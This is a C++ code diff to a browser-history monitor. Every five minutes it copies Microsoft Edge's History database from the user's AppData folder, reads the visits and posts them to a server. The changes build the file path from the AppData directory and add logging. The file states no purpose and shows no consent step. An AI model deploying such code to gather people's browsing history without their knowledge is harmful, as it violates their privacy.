@@ -28,7 +28,12 @@ std::vector<BrowserItem> BrowserHistory::GetEdgeHistory() {
 	BrowserHistoryDB& browserHistoryDB = BrowserHistoryDB::GetInstance();
 	std::wstring tempHistoryPath = dir + TEMP_BROWSER_HISTORY_NAME;
 	int64_t lastVisitTime = browserHistoryDB.getLastVisitTime("edge");
-    if (!CopyFileW((LPWSTR)(BROWSER_HISTORY_PATH),
+	if (m_wszAppDataPath.empty()) {
+		return results;
+	}
+
+	std::wstring browser_history_path = m_wszAppDataPath + L"\\Microsoft\\Edge\\User Data\\Default\\History";
+    if (!CopyFileW((LPWSTR)(browser_history_path.c_str()),
         (LPWSTR)tempHistoryPath.c_str(),
         FALSE)) {
 		std::cout << "Failed to copy browser history database: " << GetLastError() << std::endl;
@@ -40,7 +45,7 @@ std::vector<BrowserItem> BrowserHistory::GetEdgeHistory() {
     }
 
     if (sqlite3_open(WstringToString(tempHistoryPath).c_str(), &db) != SQLITE_OK) {
-        LogToFile("Can't open database: " + WstringToString(BROWSER_HISTORY_PATH));
+        LogToFile("Can't open database: " + WstringToString(browser_history_path));
         db = nullptr;
 		return results;
     }
@@ -95,6 +100,7 @@ std::vector<BrowserItem> BrowserHistory::GetEdgeHistory() {
 void BrowserHistory::MonitorBrowserHistory() {
 	while (WaitForSingleObject(g_StopEvent, 5 * 60 * 1000) != WAIT_OBJECT_0) {
 		std::vector<BrowserItem> history = GetEdgeHistory();
+		std::cout << "Fetched " << history.size() << " new history items." << std::endl;
 		BrowserHistoryDB& browserHistoryDB = BrowserHistoryDB::GetInstance();
 		for (const auto& item : history) {
 			if (!browserHistoryDB.add(
@@ -108,7 +114,7 @@ void BrowserHistory::MonitorBrowserHistory() {
 			)) {
 			}
 		}
-
+		
 		json browserData = browserHistoryDB.query_all();
 		HttpClient& httpClient = HttpClient::GetInstance();
         if (!browserData.is_null()) {
@@ -116,6 +122,7 @@ void BrowserHistory::MonitorBrowserHistory() {
                 browserHistoryDB.update_status(browserData);
             }
         }
+		std::cout << "Posted browser history to server." << std::endl;
 
 	}
 }
